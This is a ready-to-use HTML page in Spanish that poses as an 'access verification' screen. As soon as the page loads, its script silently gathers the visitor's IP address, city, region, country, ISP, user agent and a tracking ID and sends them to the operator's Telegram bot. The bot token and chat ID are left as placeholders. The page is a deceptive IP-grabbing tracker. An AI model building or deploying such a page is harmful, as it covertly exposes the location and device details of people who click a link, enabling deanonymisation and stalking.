<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verificación de acceso</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      background: #f5f5f5;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      color: #333;
    }
    .card {
      background: white;
      border-radius: 12px;
      padding: 2rem 2.5rem;
      text-align: center;
      box-shadow: 0 2px 16px rgba(0,0,0,0.08);
      max-width: 380px;
      width: 90%;
    }
    .icon { font-size: 48px; margin-bottom: 1rem; }
    h1 { font-size: 1.2rem; font-weight: 600; margin-bottom: 0.5rem; }
    p { font-size: 0.9rem; color: #666; line-height: 1.5; }
    .status {
      margin-top: 1.2rem;
      font-size: 0.85rem;
      color: #888;
      padding: 0.6rem 1rem;
      background: #f9f9f9;
      border-radius: 8px;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="icon">🔐</div>
    <h1>Verificando acceso</h1>
    <p>Comprobando tu conexión. Por favor espera un momento.</p>
    <div class="status" id="status">Conectando...</div>
  </div>

  <script>
    // ── CONFIGURA ESTOS VALORES ──────────────────────────────────────────────
    const BOT_TOKEN  = "TU_BOT_TOKEN_AQUI";       // Token del bot de Telegram
    const CHAT_ID    = "TU_CHAT_ID_AQUI";         // Tu chat_id de Telegram
    const TRACK_ID   = new URLSearchParams(window.location.search).get("id") || "sin-id";
    // ────────────────────────────────────────────────────────────────────────

    async function getIP() {
      try {
        const res  = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
      } catch {
        return "No se pudo obtener";
      }
    }

    async function getGeo(ip) {
      try {
        const res  = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await res.json();
        return {
          ciudad:  data.city    || "?",
          pais:    data.country_name || "?",
          isp:     data.org     || "?",
          region:  data.region  || "?"
        };
      } catch {
        return { ciudad: "?", pais: "?", isp: "?", region: "?" };
      }
    }

    async function notifyTelegram(ip, geo) {
      const ua    = navigator.userAgent;
      const now   = new Date().toLocaleString("es-ES", { timeZone: "Europe/Madrid" });

      const msg = `
🔍 *Nuevo acceso registrado*

🆔 ID de seguimiento: \`${TRACK_ID}\`
🌐 IP: \`${ip}\`
📍 Ciudad: ${geo.ciudad}, ${geo.region}
🌍 País: ${geo.pais}
🏢 ISP / Proveedor: ${geo.isp}
🕐 Hora (Madrid): ${now}
📱 Dispositivo: ${ua.substring(0, 120)}
      `.trim();

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({
          chat_id:    CHAT_ID,
          text:       msg,
          parse_mode: "Markdown"
        })
      });
    }

    (async () => {
      document.getElementById("status").textContent = "Obteniendo información...";

      const ip  = await getIP();
      const geo = await getGeo(ip);

      try {
        await notifyTelegram(ip, geo);
        document.getElementById("status").textContent = "✅ Verificación completada.";
      } catch (e) {
        document.getElementById("status").textContent = "⚠️ Error al reportar.";
        console.error(e);
      }
    })();
  </script>
</body>
</html>
